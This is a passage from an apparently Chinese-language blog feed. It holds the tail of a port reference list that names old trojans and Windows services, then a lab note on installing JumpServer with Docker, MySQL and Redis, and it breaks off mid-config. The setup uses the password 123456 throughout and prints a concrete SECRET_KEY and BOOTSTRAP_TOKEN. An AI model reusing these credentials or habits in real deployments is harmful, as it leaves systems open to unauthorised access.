DK开放此端口。</p><p>端口：31666</p><p>服务：[NULL]</p><p>说明：木马BOWhack开放此端口。</p><p>端口：33333</p><p>服务：[NULL]</p><p>说明：木马Prosiak开放此端口。</p><p>端口：34324</p><p>服务：[NULL]</p><p>说明：木马Tiny Telnet Server、BigGluck、TN开放此端口。</p><p>端口：40412</p><p>服务：[NULL]</p><p>说明：木马The Spy开放此端口。</p><p>端口：40421、40422、40423、40426、</p><p>服务：[NULL]</p><p>说明：木马Masters Paradise开放此端口。</p><p>端口：43210、54321</p><p>服务：[NULL]</p><p>说明：木马SchoolBus 1.0/2.0开放此端口。</p><p>端口：44445</p><p>服务：[NULL]</p><p>说明：木马Happypig开放此端口。</p><p>端口：50766</p><p>服务：[NULL]</p><p>说明：木马Fore开放此端口。</p><p>端口：53001</p><p>服务：[NULL]</p><p>说明：木马Remote Windows Shutdown开放此端口。</p><p>端口：65000<br>服务：[NULL]<br>说明：木马Devil 1.03开放此端口。</p><p>端口：88</p><p>说明：Kerberos krb5。另外TCP的88端口也是这个用途。</p><p>端口：137</p><p>说明：SQL Named Pipes encryption over other protocols name lookup(其他协议名称查找上的SQL命名管道加密技术)和SQL RPC encryption over other protocols name lookup(其他协议名称查找上的SQL RPC加密技术)和Wins NetBT name service(WINS NetBT名称服务)和Wins Proxy都用这个端口。</p><p>端口：161</p><p>说明：Simple Network Management Protocol(SMTP)（简单网络管理协议）。</p><p>端口：162</p><p>说明：SNMP Trap（SNMP陷阱）</p><p>端口：445</p><p>说明：Common Internet File System(CIFS)（公共Internet文件系统）</p><p>端口：464</p><p>说明：Kerberos kpasswd(v5)。另外TCP的464端口也是这个用途。</p><p>端口：500</p><p>说明：Internet Key Exchange(IKE)（Internet密钥交换）</p><p>端口：1645、1812</p><p>说明：Remot Authentication Dial-In User Service(RADIUS)authentication(Routing and Remote Access)(远程认证拨号用户服务)</p><p>端口：1646、1813</p><p>说明：RADIUS accounting(Routing and Remote Access)(RADIUS记帐（路由和远程访问）)</p><p>端口：1701</p><p>说明：Layer Two Tunneling Protocol(L2TP)(第2层隧道协议)</p><p>端口：1801、3527</p><p>说明：Microsoft Message Queue Server(Microsoft消息队列服务器)。还有TCP的135、1801、2101、2103、2105也是同样的用途。</p><p>端口：2504</p><p>说明：Network Load Balancing(网络平衡负荷)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第十二周</title>
    <link href="/2023/07/28/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8/"/>
    <url>/2023/07/28/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="一、安装jumpserver"><a href="#一、安装jumpserver" class="headerlink" title="一、安装jumpserver"></a>一、安装jumpserver</h3><p>基于容器部署单台：2核、4G内存、50G硬盘–最低配置<br>mysql版本大于5.7<br>redis版本大于6.0</p><p>基于docker部署：<br>环境：10.0.0.136–rocky</p><h4 id="1、设置docker-repo"><a href="#1、设置docker-repo" class="headerlink" title="1、设置docker.repo"></a>1、设置docker.repo</h4><figure class="highlight markdown"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-code">```bash</span><br><span class="hljs-code">cat /etc/yum.repo.d/docker.repo</span><br><span class="hljs-code">[docker-ce-stable]</span><br><span class="hljs-code">name=Docker CE Stable - $basearch</span><br><span class="hljs-code">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/stable</span><br><span class="hljs-code">enabled=1</span><br><span class="hljs-code">gpgcheck=1</span><br><span class="hljs-code">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="hljs-code"></span><br><span class="hljs-code">[docker-ce-stable-debuginfo]</span><br><span class="hljs-code">name=Docker CE Stable - Debuginfo $basearch</span><br><span class="hljs-code">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/stable</span><br><span class="hljs-code">enabled=0</span><br><span class="hljs-code">gpgcheck=1</span><br><span class="hljs-code">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="hljs-code"></span><br><span class="hljs-code">[docker-ce-stable-source]</span><br><span class="hljs-code">name=Docker CE Stable - Sources</span><br><span class="hljs-code">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/stable</span><br><span class="hljs-code">enabled=0</span><br><span class="hljs-code">gpgcheck=1</span><br><span class="hljs-code">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="hljs-code"></span><br><span class="hljs-code">[docker-ce-test]</span><br><span class="hljs-code">name=Docker CE Test - $basearch</span><br><span class="hljs-code">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/test</span><br><span class="hljs-code">enabled=0</span><br><span class="hljs-code">gpgcheck=1</span><br><span class="hljs-code">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="hljs-code"></span><br><span class="hljs-code">[docker-ce-test-debuginfo]</span><br><span class="hljs-code">name=Docker CE Test - Debuginfo $basearch</span><br><span class="hljs-code">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/test</span><br><span class="hljs-code">enabled=0</span><br><span class="hljs-code">gpgcheck=1</span><br><span class="hljs-code">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="hljs-code"></span><br><span class="hljs-code">[docker-ce-test-source]</span><br><span class="hljs-code">name=Docker CE Test - Sources</span><br><span class="hljs-code">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/test</span><br><span class="hljs-code">enabled=0</span><br><span class="hljs-code">gpgcheck=1</span><br><span class="hljs-code">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="hljs-code"></span><br><span class="hljs-code">[docker-ce-nightly]</span><br><span class="hljs-code">name=Docker CE Nightly - $basearch</span><br><span class="hljs-code">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/nightly</span><br><span class="hljs-code">enabled=0</span><br><span class="hljs-code">gpgcheck=1</span><br><span class="hljs-code">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="hljs-code"></span><br><span class="hljs-code">[docker-ce-nightly-debuginfo]</span><br><span class="hljs-code">name=Docker CE Nightly - Debuginfo $basearch</span><br><span class="hljs-code">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/nightly</span><br><span class="hljs-code">enabled=0</span><br><span class="hljs-code">gpgcheck=1</span><br><span class="hljs-code">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="hljs-code"></span><br><span class="hljs-code">[docker-ce-nightly-source]</span><br><span class="hljs-code">name=Docker CE Nightly - Sources</span><br><span class="hljs-code">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/nightly</span><br><span class="hljs-code">enabled=0</span><br><span class="hljs-code">gpgcheck=1</span><br><span class="hljs-code">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpgCOPY</span><br><span class="hljs-code">#配置阿里云镜像加速：</span><br><span class="hljs-code">mkdir -p /etc/docker</span><br><span class="hljs-code">cat /etc/docker/daemon.json</span><br><span class="hljs-code">&#123;</span><br><span class="hljs-code">  &quot;registry-mirrors&quot;: [&quot;https://npud8xro.mirror.aliyuncs.com&quot;]</span><br><span class="hljs-code">&#125;COPY</span><br></code></pre></td></tr></table></figure><h4 id="2、安装mysql"><a href="#2、安装mysql" class="headerlink" title="2、安装mysql"></a>2、安装mysql</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs markdown">docker run --rm --name mysql -e MYSQL<span class="hljs-emphasis">_ROOT_</span>PASSWORD=123456 -e MYSQL<span class="hljs-emphasis">_DATABASE=jumpserver -e MYSQL_</span>USER=jumpserver -e MYSQL<span class="hljs-emphasis">_PASSWORD=123456 -d -p 3306:3306 mysql:5.7.30</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">###默认的mysql不符合jumpserver配置，需修改。</span><br><span class="hljs-emphasis">docker stop mysql</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">准备相关配置和目录</span><br><span class="hljs-emphasis">mkdir -p /etc/mysql/mysql.conf.d/</span><br><span class="hljs-emphasis">mkdir -p /etc/mysql/conf.d/</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">指定字符集</span><br><span class="hljs-emphasis">tee /etc/mysql/mysql.conf.d/mysqld.cnf &lt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">EOF</span></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis">[<span class="hljs-attr">mysqld</span>]</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"><span class="hljs-attr">pid-file</span>= <span class="hljs-string">/var/run/mysqld/mysqld.pid</span></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"><span class="hljs-attr">socket</span>= <span class="hljs-string">/var/run/mysqld/mysqld.sock</span></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"><span class="hljs-attr">datadir</span>= <span class="hljs-string">/var/lib/mysql</span></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"><span class="hljs-attr">symbolic-links</span>=<span class="hljs-string">0</span></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"><span class="hljs-attr">character-set-server</span>=<span class="hljs-string">utf8</span> </span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"><span class="hljs-attr">EOF</span></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"><span class="hljs-attr">tee</span> /<span class="hljs-attr">etc</span>/<span class="hljs-attr">mysql</span>/<span class="hljs-attr">conf.d</span>/<span class="hljs-attr">mysql.cnf</span> &lt;&lt;<span class="hljs-attr">EOF</span></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis">[<span class="hljs-attr">mysql</span>]</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"><span class="hljs-attr">default-character-set</span>=<span class="hljs-string">utf8</span></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"><span class="hljs-attr">EOF</span></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis">将上面宿主机的设置好的配置文件挂载至<span class="hljs-attr">MySQL</span>容器</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"><span class="hljs-attr">docker</span> <span class="hljs-attr">run</span> <span class="hljs-attr">-d</span> <span class="hljs-attr">-p</span> <span class="hljs-attr">3306:3306</span> <span class="hljs-attr">--name</span> <span class="hljs-attr">mysql</span> <span class="hljs-attr">--restart</span> <span class="hljs-attr">always</span> <span class="hljs-attr">-e</span> <span class="hljs-attr">MYSQL_ROOT_PASSWORD</span>=<span class="hljs-string">123456</span> <span class="hljs-attr">-e</span> <span class="hljs-attr">MYSQL_DATABASE</span>=<span class="hljs-string">jumpserver</span> <span class="hljs-attr">-e</span> <span class="hljs-attr">MYSQL_USER</span>=<span class="hljs-string">jumpserver</span> <span class="hljs-attr">-e</span> <span class="hljs-attr">MYSQL_PASSWORD</span>=<span class="hljs-string">123456</span> <span class="hljs-attr">-v</span> /<span class="hljs-attr">data</span>/<span class="hljs-attr">mysql:</span>/<span class="hljs-attr">var</span>/<span class="hljs-attr">lib</span>/<span class="hljs-attr">mysql</span> <span class="hljs-attr">-v</span> /<span class="hljs-attr">etc</span>/<span class="hljs-attr">mysql</span>/<span class="hljs-attr">mysql.conf.d</span>/<span class="hljs-attr">mysqld.cnf:</span>/<span class="hljs-attr">etc</span>/<span class="hljs-attr">mysql</span>/<span class="hljs-attr">mysql.conf.d</span>/<span class="hljs-attr">mysqld.cnf</span> <span class="hljs-attr">-v</span> /<span class="hljs-attr">etc</span>/<span class="hljs-attr">mysql</span>/<span class="hljs-attr">conf.d</span>/<span class="hljs-attr">mysql.cnf:</span>/<span class="hljs-attr">etc</span>/<span class="hljs-attr">mysql</span>/<span class="hljs-attr">conf.d</span>/<span class="hljs-attr">mysql.cnf</span> <span class="hljs-attr">mysql:5.7.30</span></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis">验证<span class="hljs-attr">mysql</span></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"><span class="hljs-attr">docker</span> <span class="hljs-attr">exec</span> <span class="hljs-attr">-it</span> <span class="hljs-attr">mysql</span> <span class="hljs-attr">shCOPY</span></span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"># <span class="hljs-attr">mysql</span> <span class="hljs-attr">-p123456</span> <span class="hljs-attr">-e</span> &#x27;<span class="hljs-attr">show</span> <span class="hljs-attr">variables</span> <span class="hljs-attr">like</span> &quot;<span class="hljs-attr">character</span>%&quot;&#x27;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"># <span class="hljs-attr">mysql</span> <span class="hljs-attr">-p123456</span> <span class="hljs-attr">-e</span> &#x27;<span class="hljs-attr">show</span> <span class="hljs-attr">variables</span> <span class="hljs-attr">like</span> &quot;<span class="hljs-attr">collation</span>%&quot;&#x27;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-emphasis"># <span class="hljs-attr">mysql</span> <span class="hljs-attr">-p123456</span> <span class="hljs-attr">-e</span> &#x27;<span class="hljs-attr">select</span> <span class="hljs-attr">user</span>,<span class="hljs-attr">host</span> <span class="hljs-attr">from</span> <span class="hljs-attr">mysql.user</span>&#x27;<span class="hljs-attr">COPY</span></span></span></span><br></code></pre></td></tr></table></figure><p>验证是否可以远程登录：<br>mysql -ujumpserver -p123456 -h10.0.0.136</p><h4 id="3、安装redis"><a href="#3、安装redis" class="headerlink" title="3、安装redis"></a>3、安装redis</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-code">`docker run -d -p 6379:6379 --name redis --restart always redis:6.2.5`</span><br><br>验证redis是否正常连接<br>redis-cli -h 10.0.0.136COPY<br></code></pre></td></tr></table></figure><h4 id="4、生成key-官方有文档"><a href="#4、生成key-官方有文档" class="headerlink" title="4、生成key,官方有文档"></a>4、生成key,官方有文档</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section">#!/bin/bash</span><br>if [ ! &quot;$SECRET<span class="hljs-emphasis">_KEY&quot; ]; then</span><br><span class="hljs-emphasis">SECRET_</span>KEY=<span class="hljs-code">`cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 50`</span>;<br>echo &quot;SECRET<span class="hljs-emphasis">_KEY=$SECRET_</span>KEY&quot; &gt;&gt; ~/.bashrc;<br>echo SECRET<span class="hljs-emphasis">_KEY=$SECRET_</span>KEY;<br>else<br>echo SECRET<span class="hljs-emphasis">_KEY=$SECRET_</span>KEY;<br>fi<br>if [ ! &quot;$BOOTSTRAP<span class="hljs-emphasis">_TOKEN&quot; ]; then</span><br><span class="hljs-emphasis">BOOTSTRAP_</span>TOKEN=<span class="hljs-code">`cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 16`</span>;<br>echo &quot;BOOTSTRAP<span class="hljs-emphasis">_TOKEN=$BOOTSTRAP_</span>TOKEN&quot; &gt;&gt; ~/.bashrc;<br>echo BOOTSTRAP<span class="hljs-emphasis">_TOKEN=$BOOTSTRAP_</span>TOKEN;<br>else<br>echo BOOTSTRAP<span class="hljs-emphasis">_TOKEN=$BOOTSTRAP_</span>TOKEN;<br>fiCOPY<br></code></pre></td></tr></table></figure><p>运行脚本，结果显示key和token。<br>可用tail -n2 ~/.bashrc 查看生成的key和token</p><h4 id="5、看官方文档、看官方文档、看官方文档。别人讲的终归是别人讲的也有可能是错的。。。"><a href="#5、看官方文档、看官方文档、看官方文档。别人讲的终归是别人讲的也有可能是错的。。。" class="headerlink" title="5、看官方文档、看官方文档、看官方文档。别人讲的终归是别人讲的也有可能是错的。。。"></a>5、看官方文档、看官方文档、看官方文档。别人讲的终归是别人讲的也有可能是错的。。。</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs markdown">地址：https://docs.jumpserver.org/zh/master/install/setup<span class="hljs-emphasis">_by_</span>fast/#<span class="hljs-emphasis">_3</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">官网安装命令：</span><br><span class="hljs-emphasis">cd /opt</span><br><span class="hljs-emphasis">wget https://github.com/jumpserver/installer/releases/download/v2.27.0/jumpserver-installer-v2.27.0.tar.gz #下载安装包</span><br><span class="hljs-emphasis">tar -xf jumpserver-installer-v2.27.0.tar.gz</span><br><span class="hljs-emphasis">cd jumpserver-installer-v2.27.0</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"># 根据需要修改配置文件模板, 如果不清楚用途可以跳过修改，这里是已经改过的。jumpserver安装是会根据配置文件自动选择</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">cat config-example.txt</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"># JumpServer configuration file example.</span><br><span class="hljs-emphasis">#</span><br><span class="hljs-emphasis"># 如果不了解用途可以跳过修改此配置文件, 系统会自动填入</span><br><span class="hljs-emphasis"># 完整参数文档 https://docs.jumpserver.org/zh/master/admin-guide/env/</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">################################## 镜像配置 ###################################</span><br><span class="hljs-emphasis">#</span><br><span class="hljs-emphasis"># 国内连接 docker.io 会超时或下载速度较慢, 开启此选项使用华为云镜像加速</span><br><span class="hljs-emphasis"># 取代旧版本 DOCKER_</span>IMAGE<span class="hljs-emphasis">_PREFIX</span><br><span class="hljs-emphasis">#</span><br><span class="hljs-emphasis">DOCKER_</span>IMAGE<span class="hljs-emphasis">_MIRROR=1</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">################################## 安装配置 ###################################</span><br><span class="hljs-emphasis">#</span><br><span class="hljs-emphasis"># JumpServer 数据库持久化目录, 默认情况下录像、任务日志都在此目录</span><br><span class="hljs-emphasis"># 请根据实际情况修改, 升级时备份的数据库文件(.sql)和配置文件也会保存到该目录</span><br><span class="hljs-emphasis">#</span><br><span class="hljs-emphasis">VOLUME_</span>DIR=/opt/jumpserver<br><br><span class="hljs-section"># 加密密钥, 迁移请保证 SECRET<span class="hljs-emphasis">_KEY 与旧环境一致, 请勿使用特殊字符串</span></span><br><span class="hljs-emphasis"><span class="hljs-section"># (*) Warning: Keep this value secret.</span></span><br><span class="hljs-emphasis"><span class="hljs-section"># (*) 勿向任何人泄露 SECRET_</span>KEY</span><br><span class="hljs-section">#</span><br>SECRET<span class="hljs-emphasis">_KEY=WoGoMXpkhmTN1lePpx694NysQfCefj8R9jLDuDuQ5W0MO9XCeS</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"># 组件向 core 注册使用的 token, 迁移请保持 BOOTSTRAP_</span>TOKEN 与旧环境一致,<br><span class="hljs-section"># 请勿使用特殊字符串</span><br><span class="hljs-section"># (<span class="hljs-emphasis">*) Warning: Keep this value secret.</span></span><br><span class="hljs-emphasis"><span class="hljs-section"># (*</span>) 勿向任何人泄露 BOOTSTRAP<span class="hljs-emphasis">_TOKEN</span></span><br><span class="hljs-emphasis"><span class="hljs-section">#</span></span><br><span class="hljs-emphasis"><span class="hljs-section">BOOTSTRAP_</span>TOKEN=LcvHUEldOsJ1ZAHO</span><br><br><span class="hljs-section"># 日志等级 INFO, WARN, ERROR</span><br><span class="hljs-section">#</span><br>LOG<span class="hljs-emphasis">_LEVEL=ERROR</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"># JumpServer 容器使用的网段, 请勿与现有的网络冲突, 根据实际情况自行修改</span><br><span class="hljs-emphasis">#</span><br><span class="hljs-emphasis">DOCKER_</span>SUBNET=192.168.250.0/24<br><br><span class="hljs-section"># ipv6 nat, 正常情况下无需开启</span><br><span class="hljs-section"># 如果宿主不支持 ipv6 开启此选项将会导致无法获取真实的客户端 ip 地址</span><br><span class="hljs-section">#</span><br>USE<span class="hljs-emphasis">_IPV6=0</span><br><span class="hljs-emphasis">DOCKER_</span>SUBNET<span class="hljs-emphasis">_IPV6=fc00:1010:1111:200::/64</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">################################# MySQL 配置 ##################################</span><br><span class="hljs-emphasis"># 外置 MySQL 需要输入正确的 MySQL 信息, 内置 MySQL 系统会自动处理</span><br><span class="hljs-emphasis">#</span><br><span class="hljs-emphasis">DB_</span>HOST=10.0.0.136<br>DB<span class="hljs-emphasis">_PORT=3306</span><br><span class="hljs-emphasis">DB_</span>USER=jumpserver<br>DB<span class="hljs-emphasis">_PASSWORD=123456</span><br><span class="hljs-emphasis">DB_</span>NAME=jumpserver<br><br><span class="hljs-section">################################# Redis 配置 ##################################</span><br><span class="hljs-section"># 外置 Redis 需要请输入正确的 Redis 信息, 内置 Redis 系统会自动处理</span><br><span class="hljs-section">#</span><br>REDIS<span class="hljs-emphasis">_HOST=10.0.0.136</span><br><span class="hljs-emphasis">REDIS_</span>PORT=6379<br>REDIS<span class="hljs-emphasis">_PASSWORD=</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">################################## 访问配置 ###################################</span><br><span class="hljs-emphasis"># 对外提供服务端口, 如果与现有服务冲突请自行修改</span><br><span class="hljs-emphasis"># 如果不想对外提供访问可以使用 127.0.0.1:<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span></span>, eg: 127.0.0.1:33060</span><br><span class="hljs-emphasis">#</span><br><span class="hljs-emphasis">HTTP_</span>PORT=80<br>SSH<span class="hljs-emphasis">_PORT=2222</span><br><span class="hljs-emphasis">MAGNUS_</span>PORTS=30000-30100<br><br><span class="hljs-section">################################# HTTPS 配置 #################################</span><br><span class="hljs-section"># 参考 https://docs.jumpserver.org/zh/master/admin-guide/proxy/ 配置</span><br><span class="hljs-section">#</span><br><span class="hljs-section"># USE<span class="hljs-emphasis">_LB=1</span></span><br><span class="hljs-emphasis"><span class="hljs-section"># HTTPS_</span>PORT=443</span><br><span class="hljs-section"># SERVER<span class="hljs-emphasis">_NAME=your_</span>domain<span class="hljs-emphasis">_name</span></span><br><span class="hljs-emphasis"><span class="hljs-section"># SSL_</span>CERTIFICATE=your<span class="hljs-emphasis">_cert</span></span><br><span class="hljs-emphasis"><span class="hljs-section"># SSL_</span>CERTIFICATE<span class="hljs-emphasis">_KEY=your_</span>cert<span class="hljs-emphasis">_key</span></span><br><span class="hljs-emphasis"><span class="hljs-section">#</span></span><br><span class="hljs-emphasis"><span class="hljs-section">CLIENT_</span>MAX<span class="hljs-emphasis">_BODY_</span>SIZE=4096m</span><br><br><span class="hljs-section">################################## 组件配置 ###################################</span><br><span class="hljs-section"># 组件注册使用, 默认情况下向 core 容器注册, 集群环境需要修改为集群 vip 地址</span><br><span class="hljs-section">#</span><br>CORE<span class="hljs-emphasis">_HOST=http://core:8080</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"># Task 配置, 是否启动 jms_</span>celery 容器, 单节点必须开启<br><span class="hljs-section">#</span><br>USE<span class="hljs-emphasis">_TASK=1</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"># XPack 包, 企业版本自动开启, 开源版本设置无效</span><br><span class="hljs-emphasis">#</span><br><span class="hljs-emphasis">RDP_</span>PORT=3389<br><br><span class="hljs-section"># Core Session 定义,</span><br><span class="hljs-section"># SESSION<span class="hljs-emphasis">_COOKIE_</span>AGE 表示闲置多少秒后 session 过期,</span><br><span class="hljs-section"># SESSION<span class="hljs-emphasis">_EXPIRE_</span>AT<span class="hljs-emphasis">_BROWSER_</span>CLOSE=true 表示关闭浏览器即 session 过期</span><br><span class="hljs-section">#</span><br><span 